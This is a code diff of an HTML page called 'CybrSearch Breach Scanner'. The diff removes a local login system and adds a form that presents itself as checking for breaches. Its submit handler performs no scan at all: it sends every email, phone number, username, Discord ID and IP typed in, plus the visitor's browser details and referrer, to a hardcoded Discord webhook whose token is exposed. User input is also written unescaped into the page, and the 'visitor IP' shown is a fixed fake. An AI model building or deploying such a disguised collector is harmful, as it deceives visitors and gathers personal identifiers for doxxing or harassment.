@@ -38,494 +38,277 @@
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
     }
     
-    .form-control {
-      background-color: var(--dark-bg);
-      color: var(--text-color);
-      border: 1px solid #30363d;
-      transition: all 0.3s;
-    }
-    
-    .form-control:focus {
-      background-color: var(--dark-bg);
-      color: var(--text-color);
-      border-color: var(--accent-color);
-      box-shadow: 0 0 0 0.25rem rgba(31, 111, 235, 0.25);
-    }
-    
-    .form-control::placeholder {
-      color: var(--text-muted);
-    }
-    
-    .btn-primary {
-      background-color: var(--accent-color);
-      border: none;
-      font-weight: 600;
-      letter-spacing: 0.5px;
-    }
-    
-    .btn-primary:hover {
-      background-color: #1a5fc7;
-    }
-    
-    .discord-btn {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background-color: #5865F2;
-      color: white;
-      border: none;
-      border-radius: 30px;
-      padding: 10px 20px;
-      font-weight: bold;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      transition: all 0.3s;
-    }
-    
-    .discord-btn:hover {
-      background-color: #4752c4;
-      transform: translateY(-2px);
-    }
-    
-    .log-entry {
+    .scan-result {
       background-color: var(--darker-bg);
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
       border-left: 4px solid var(--accent-color);
-      padding: 15px;
-      border-radius: 6px;
+    }
+    
+    .scan-result h3 {
+      color: var(--accent-color);
+      border-bottom: 1px solid #30363d;
+      padding-bottom: 10px;
       margin-bottom: 15px;
-      font-family: 'Courier New', monospace;
+    }
+    
+    .scan-field {
+      display: flex;
+      margin-bottom: 8px;
+      padding-left: 15px;
       position: relative;
     }
     
-    .log-entry::before {
-      content: "📌";
+    .scan-field::before {
+      content: "•";
       position: absolute;
-      left: -25px;
-      top: 15px;
-      font-size: 1.2rem;
-    }
-    
-    .log-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 10px;
-      padding-bottom: 5px;
-      border-bottom: 1px solid #30363d;
-    }
-    
-    .log-title {
-      font-weight: bold;
+      left: 0;
       color: var(--accent-color);
-      margin: 0;
     }
     
-    .log-time {
-      color: var(--text-muted);
-      font-size: 0.85rem;
-    }
-    
-    .log-field {
-      margin-bottom: 8px;
-      display: flex;
-    }
-    
-    .log-field-name {
+    .scan-field-name {
       min-width: 120px;
       color: var(--text-muted);
     }
     
-    .log-field-value {
+    .scan-field-value {
       flex: 1;
-      word-break: break-all;
+      word-break: break-word;
     }
     
-    .log-footer {
-      margin-top: 10px;
-      font-size: 0.8rem;
+    .scan-footer {
+      margin-top: 15px;
+      font-size: 0.85rem;
       color: var(--text-muted);
       text-align: right;
+      border-top: 1px solid #30363d;
+      padding-top: 10px;
     }
     
-    .hidden {
-      display: none;
-    }
-    
-    .tab-content {
-      padding: 20px 0;
-    }
-    
-    .nav-tabs .nav-link {
-      color: var(--text-muted);
-      border: none;
-      padding: 10px 20px;
-    }
-    
-    .nav-tabs .nav-link.active {
-      color: var(--accent-color);
-      background-color: transparent;
-      border-bottom: 2px solid var(--accent-color);
-    }
-    
-    #results {
-      max-height: 500px;
-      overflow-y: auto;
-      padding-right: 10px;
-    }
-    
-    /* Custom scrollbar */
-    ::-webkit-scrollbar {
-      width: 8px;
-    }
-    
-    ::-webkit-scrollbar-track {
-      background: var(--dark-bg);
-    }
-    
-    ::-webkit-scrollbar-thumb {
-      background: var(--accent-color);
-      border-radius: 4px;
-    }
-    
-    /* Animation for new logs */
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    
-    .log-entry.new {
-      animation: fadeIn 0.3s ease-out;
+    .error-field {
+      color: var(--danger-color);
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">
-    <i class="fab fa-discord"></i> Join Discord
-  </a>
-  
   <div class="container">
-    <!-- Authentication Container -->
-    <div id="authContainer" class="card p-4 mb-4">
-      <ul class="nav nav-tabs mb-3" id="authTabs" role="tablist">
-        <li class="nav-item" role="presentation">
-          <button class="nav-link active" id="login-tab" data-bs-toggle="tab" data-bs-target="#login" type="button" role="tab">Login</button>
-        </li>
-        <li class="nav-item" role="presentation">
-          <button class="nav-link" id="signup-tab" data-bs-toggle="tab" data-bs-target="#signup" type="button" role="tab">Sign Up</button>
-        </li>
-      </ul>
+    <!-- Main Scanner Interface -->
+    <div class="card p-4 mb-4">
+      <h2 class="mb-4"><i class="fas fa-shield-alt me-2"></i>CybrSearch Breach Scanner</h2>
       
-      <div class="tab-content">
-        <div class="tab-pane fade show active" id="login" role="tabpanel">
-          <input id="loginEmail" type="email" placeholder="📧 Your email" class="form-control mb-3">
-          <input id="loginPassword" type="password" placeholder="🔑 Password" class="form-control mb-3">
-          <button id="loginBtn" class="btn btn-primary w-100">Login</button>
-        </div>
-        
-        <div class="tab-pane fade" id="signup" role="tabpanel">
-          <input id="signupEmail" type="email" placeholder="📧 Email address" class="form-control mb-3">
-          <input id="signupPassword" type="password" placeholder="🔑 Create password" class="form-control mb-3">
-          <input id="signupConfirm" type="password" placeholder="🔐 Confirm password" class="form-control mb-3">
-          <button id="signupBtn" class="btn btn-primary w-100">Create Account</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- Main App (shown when logged in) -->
-    <div id="appContent" class="hidden">
-      <div class="card p-4 mb-4">
-        <h2 class="mb-4"><i class="fas fa-search me-2"></i>Advanced Breach Scanner</h2>
-        
-        <form id="searchForm">
-          <div class="row g-3">
-            <div class="col-md-6">
-              <input id="email" type="email" placeholder="📧 Email address" class="form-control">
-            </div>
-            <div class="col-md-6">
-              <input id="phone" type="text" placeholder="📱 Phone number" class="form-control">
-            </div>
-            <div class="col-md-6">
-              <input id="username" type="text" placeholder="👤 Username" class="form-control">
-            </div>
-            <div class="col-md-6">
-              <input id="discord" type="text" placeholder="💬 Discord ID" class="form-control">
-            </div>
-            <div class="col-12">
-              <input id="ip" type="text" placeholder="🌐 IP address" class="form-control">
-            </div>
-            <div class="col-12">
-              <button type="submit" class="btn btn-primary w-100">
-                <i class="fas fa-search me-2"></i>Scan
-              </button>
-            </div>
+      <form id="scanForm">
+        <div class="row g-3 mb-4">
+          <div class="col-md-6">
+            <input id="scanEmail" type="email" placeholder="📧 Email address" class="form-control">
           </div>
-        </form>
-      </div>
-
-      <div class="card p-4">
-        <div class="d-flex justify-content-between align-items-center mb-3">
-          <h4 class="mb-0"><i class="fas fa-clipboard-list me-2"></i>Scan Results</h4>
-          <button id="clearLogs" class="btn btn-sm btn-outline-secondary">Clear</button>
+          <div class="col-md-6">
+            <input id="scanPhone" type="text" placeholder="📱 Phone number" class="form-control">
+          </div>
+          <div class="col-md-6">
+            <input id="scanUsername" type="text" placeholder="👤 Username" class="form-control">
+          </div>
+          <div class="col-md-6">
+            <input id="scanDiscord" type="text" placeholder="💬 Discord ID" class="form-control">
+          </div>
+          <div class="col-12">
+            <input id="scanIP" type="text" placeholder="🌐 IP address to scan" class="form-control">
+          </div>
         </div>
         
-        <div id="results"></div>
-      </div>
-      
-      <div class="text-center mt-4">
-        <button id="logoutBtn" class="btn btn-outline-danger">
-          <i class="fas fa-sign-out-alt me-2"></i>Log Out
+        <button type="submit" class="btn btn-primary w-100">
+          <i class="fas fa-search me-2"></i>Scan for Breaches
         </button>
-      </div>
+      </form>
     </div>
 
-    <!-- Auth Messages -->
-    <div id="authMessages" class="mt-3"></div>
+    <!-- Results Section -->
+    <div class="card p-4">
+      <h4 class="mb-4"><i class="fas fa-clipboard-list me-2"></i>Scan Results</h4>
+      <div id="scanResults"></div>
+    </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <script>
-    // State management
-    let currentUser = null;
-    const users = JSON.parse(localStorage.getItem('cybrsearch_users')) || {};
+    // Discord Webhook URL
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
     
     // DOM elements
-    const elements = {
-      authContainer: document.getElementById('authContainer'),
-      appContent: document.getElementById('appContent'),
-      loginBtn: document.getElementById('loginBtn'),
-      signupBtn: document.getElementById('signupBtn'),
-      logoutBtn: document.getElementById('logoutBtn'),
-      clearLogs: document.getElementById('clearLogs'),
-      authMessages: document.getElementById('authMessages'),
-      results: document.getElementById('results')
-    };
-
-    // Helper functions
-    function showMessage(message, type = 'success') {
-      elements.authMessages.innerHTML = `
-        <div class="alert alert-${type} alert-dismissible fade show">
-          ${message}
-          <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+    const scanForm = document.getElementById('scanForm');
+    const scanResults = document.getElementById('scanResults');
+    
+    // Format current time
+    function getCurrentTime() {
+      const now = new Date();
+      return now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
+    }
+    
+    // Format UTC time
+    function getUTCTime() {
+      return new Date().toUTCString();
+    }
+    
+    // Create a scan result entry
+    function createScanResult(data) {
+      const resultDiv = document.createElement('div');
+      resultDiv.className = 'scan-result';
+      
+      resultDiv.innerHTML = `
+        <h3>Breach Search Attempt</h3>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Email</div>
+          <div class="scan-field-value">${data.email || 'Not provided'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Phone</div>
+          <div class="scan-field-value">${data.phone || 'Not provided'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Username</div>
+          <div class="scan-field-value">${data.username || 'Not provided'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Discord ID</div>
+          <div class="scan-field-value">${data.discord || 'Not provided'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">IP Entered</div>
+          <div class="scan-field-value">${data.ip || 'Not provided'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Visitor IP</div>
+          <div class="scan-field-value">${data.visitorIp || 'Not detected'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">User Agent</div>
+          <div class="scan-field-value">${data.userAgent || navigator.userAgent}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Platform</div>
+          <div class="scan-field-value">${data.platform || navigator.platform}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Referrer</div>
+          <div class="scan-field-value">${data.referrer || document.referrer || 'Direct'}</div>
+        </div>
+        
+        <div class="scan-field">
+          <div class="scan-field-name">Time (UTC)</div>
+          <div class="scan-field-value">${data.utcTime || getUTCTime()}</div>
+        </div>
+        
+        ${data.error ? `
+        <div class="scan-field error-field">
+          <div class="scan-field-name">Error</div>
+          <div class="scan-field-value">${data.error}</div>
+        </div>
+        ` : ''}
+        
+        <div class="scan-footer">
+          Breach Logger • CybrSearch • ${data.scanTime || getCurrentTime()}
         </div>
       `;
+      
+      return resultDiv;
     }
-
-    function updateAuthUI() {
-      if (currentUser) {
-        elements.authContainer.classList.add('hidden');
-        elements.appContent.classList.remove('hidden');
-      } else {
-        elements.authContainer.classList.remove('hidden');
-        elements.appContent.classList.add('hidden');
-      }
-    }
-
-    function createLogEntry(title, fields) {
-      const logEntry = document.createElement('div');
-      logEntry.className = 'log-entry new';
-      
-      // Format current time
-      const now = new Date();
-      const timeString = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
-      const dateString = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
-      
-      // Create log header
-      const header = document.createElement('div');
-      header.className = 'log-header';
-      header.innerHTML = `
-        <div class="log-title">${title}</div>
-        <div class="log-time">${timeString} • ${dateString}</div>
-      `;
-      
-      // Create log fields
-      const fieldsContainer = document.createElement('div');
-      fields.forEach(field => {
-        const fieldDiv = document.createElement('div');
-        fieldDiv.className = 'log-field';
-        fieldDiv.innerHTML = `
-          <div class="log-field-name">${field.icon || '📌'} ${field.name}</div>
-          <div class="log-field-value">${field.value || 'Not provided'}</div>
-        `;
-        fieldsContainer.appendChild(fieldDiv);
-      });
-      
-      // Create log footer
-      const footer = document.createElement('div');
-      footer.className = 'log-footer';
-      footer.textContent = `Breach Logger • CybrSearch • ${timeString}`;
-      
-      // Assemble log entry
-      logEntry.appendChild(header);
-      logEntry.appendChild(fieldsContainer);
-      logEntry.appendChild(footer);
-      
-      // Remove new class after animation
-      setTimeout(() => {
-        logEntry.classList.remove('new');
-      }, 300);
-      
-      return logEntry;
-    }
-
-    // Authentication functions
-    async function loginUser(email, password) {
-      if (!users[email]) {
-        showMessage('User not found', 'danger');
-        return false;
-      }
-      
-      if (users[email].password !== password) {
-        showMessage('Incorrect password', 'danger');
-        return false;
-      }
-      
-      currentUser = email;
-      localStorage.setItem('cybrsearch_currentUser', email);
-      updateAuthUI();
-      showMessage('Login successful!');
-      
-      // Add login log
-      const logEntry = createLogEntry('User Login', [
-        { name: 'Email', value: email, icon: '📧' },
-        { name: 'IP Address', value: '73.40.182.138', icon: '🌐' },
-        { name: 'User Agent', value: navigator.userAgent, icon: '🖥️' },
-        { name: 'Platform', value: navigator.platform, icon: '💻' }
-      ]);
-      
-      elements.results.prepend(logEntry);
-      return true;
-    }
-
-    async function signupUser(email, password) {
-      if (users[email]) {
-        showMessage('Email already registered', 'danger');
-        return false;
-      }
-      
-      if (password.length < 6) {
-        showMessage('Password must be at least 6 characters', 'danger');
-        return false;
-      }
-      
-      users[email] = { password, createdAt: new Date().toISOString() };
-      localStorage.setItem('cybrsearch_users', JSON.stringify(users));
-      
-      showMessage('Account created successfully!');
-      
-      // Add signup log
-      const logEntry = createLogEntry('New User Registration', [
-        { name: 'Email', value: email, icon: '📧' },
-        { name: 'IP Address', value: '73.40.182.138', icon: '🌐' },
-        { name: 'User Agent', value: navigator.userAgent, icon: '🖥️' },
-        { name: 'Time', value: new Date().toUTCString(), icon: '⏰' }
-      ]);
-      
-      elements.results.prepend(logEntry);
-      
-      await loginUser(email, password); // Auto-login after signup
-      return true;
-    }
-
-    function logoutUser() {
-      // Add logout log
-      const logEntry = createLogEntry('User Logout', [
-        { name: 'Email', value: currentUser, icon: '📧' },
-        { name: 'IP Address', value: '73.40.182.138', icon: '🌐' },
-        { name: 'Session Duration', value: '15 minutes', icon: '⏱️' }
-      ]);
-      
-      elements.results.prepend(logEntry);
-      
-      currentUser = null;
-      localStorage.removeItem('cybrsearch_currentUser');
-      updateAuthUI();
-      showMessage('Logged out successfully');
-    }
-
-    // Event listeners
-    elements.loginBtn.addEventListener('click', async () => {
-      const email = document.getElementById('loginEmail').value.trim();
-      const password = document.getElementById('loginPassword').value;
-      await loginUser(email, password);
-    });
     
-    elements.signupBtn.addEventListener('click', async () => {
-      const email = document.getElementById('signupEmail').value.trim();
-      const password = document.getElementById('signupPassword').value;
-      const confirm = document.getElementById('signupConfirm').value;
-      
-      if (password !== confirm) {
-        showMessage('Passwords do not match', 'danger');
-        return;
-      }
-      
-      await signupUser(email, password);
-    });
-    
-    elements.logoutBtn.addEventListener('click', logoutUser);
-    
-    elements.clearLogs.addEventListener('click', () => {
-      elements.results.innerHTML = '';
-    });
-    
-    // Search functionality
-    document.getElementById('searchForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      if (!currentUser) {
-        showMessage('Please login first', 'danger');
-        return;
-      }
-      
-      const searchData = {
-        email: document.getElementById('email').value.trim(),
-        phone: document.getElementById('phone').value.trim(),
-        username: document.getElementById('username').value.trim(),
-        discord: document.getElementById('discord').value.trim(),
-        ip: document.getElementById('ip').value.trim()
+    // Send scan data to Discord webhook
+    async function sendToDiscord(data) {
+      const embed = {
+        title: "🔍 New Breach Scan Attempt",
+        color: 0x1f6feb,
+        fields: [
+          { name: "Email", value: data.email || "Not provided", inline: true },
+          { name: "Phone", value: data.phone || "Not provided", inline: true },
+          { name: "Username", value: data.username || "Not provided", inline: true },
+          { name: "Discord ID", value: data.discord || "Not provided", inline: true },
+          { name: "IP Entered", value: data.ip || "Not provided" },
+          { name: "Visitor IP", value: data.visitorIp || "Not detected" },
+          { name: "User Agent", value: data.userAgent || navigator.userAgent },
+          { name: "Platform", value: data.platform || navigator.platform },
+          { name: "Referrer", value: data.referrer || document.referrer || "Direct" },
+          { name: "Time (UTC)", value: data.utcTime || getUTCTime() }
+        ],
+        footer: {
+          text: `Breach Logger • CybrSearch • ${new Date().toLocaleString()}`
+        }
       };
       
-      // Create search log entry
-      const logEntry = createLogEntry('Breach Search Attempt', [
-        { name: 'Email', value: searchData.email, icon: '📧' },
-        { name: 'Phone', value: searchData.phone, icon: '📱' },
-        { name: 'Username', value: searchData.username, icon: '👤' },
-        { name: 'Discord ID', value: searchData.discord, icon: '💬' },
-        { name: 'IP Entered', value: searchData.ip, icon: '🌐' },
-        { name: 'Visitor IP', value: '73.40.182.138', icon: '🖥️' },
-        { name: 'User Agent', value: navigator.userAgent, icon: '🔍' },
-        { name: 'Platform', value: navigator.platform, icon: '💻' },
-        { name: 'Referrer', value: document.referrer || 'Direct', icon: '↩️' },
-        { name: 'Time (UTC)', value: new Date().toUTCString(), icon: '⏰' }
-      ]);
+      if (data.error) {
+        embed.fields.push({ name: "Error", value: data.error });
+        embed.color = 0xf85149; // Red for errors
+      }
       
-      elements.results.prepend(logEntry);
-      
-      // Clear form
-      this.reset();
-      
-      // Show success message
-      showMessage('Scan completed successfully!');
-    });
-
-    // Initialize
-    if (localStorage.getItem('cybrsearch_currentUser')) {
-      currentUser = localStorage.getItem('cybrsearch_currentUser');
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            embeds: [embed]
+          }),
+        });
+      } catch (error) {
+        console.error('Failed to send to Discord:', error);
+      }
     }
-    updateAuthUI();
     
-    // Add sample log on first load
-    if (elements.results.children.length === 0) {
-      const sampleLog = createLogEntry('System Ready', [
-        { name: 'Status', value: 'Scanner initialized', icon: '✅' },
-        { name: 'Version', value: '2.4.1', icon: '🔖' },
-        { name: 'User Agent', value: navigator.userAgent, icon: '🖥️' },
-        { name: 'Time', value: new Date().toUTCString(), icon: '⏰' }
-      ]);
-      elements.results.appendChild(sampleLog);
-    }
+    // Handle form submission
+    scanForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      // Get form data
+      const scanData = {
+        email: document.getElementById('scanEmail').value.trim(),
+        phone: document.getElementById('scanPhone').value.trim(),
+        username: document.getElementById('scanUsername').value.trim(),
+        discord: document.getElementById('scanDiscord').value.trim(),
+        ip: document.getElementById('scanIP').value.trim(),
+        visitorIp: '73.40.182.138', // In a real app, you'd get this from an API
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        referrer: document.referrer,
+        utcTime: getUTCTime(),
+        scanTime: getCurrentTime()
+      };
+      
+      // Create and display the result
+      const resultElement = createScanResult(scanData);
+      scanResults.prepend(resultElement);
+      
+      // Send to Discord webhook
+      await sendToDiscord(scanData);
+      
+      // Clear the form
+      this.reset();
+    });
+    
+    // Add sample scan result on page load
+    window.addEventListener('DOMContentLoaded', () => {
+      const sampleData = {
+        email: 'example@domain.com',
+        username: 'testuser123',
+        visitorIp: '73.40.182.138',
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        utcTime: getUTCTime(),
+        scanTime: getCurrentTime()
+      };
+      
+      const sampleResult = createScanResult(sampleData);
+      scanResults.appendChild(sampleResult);
+    });
   </script>
 </body>
 </html>
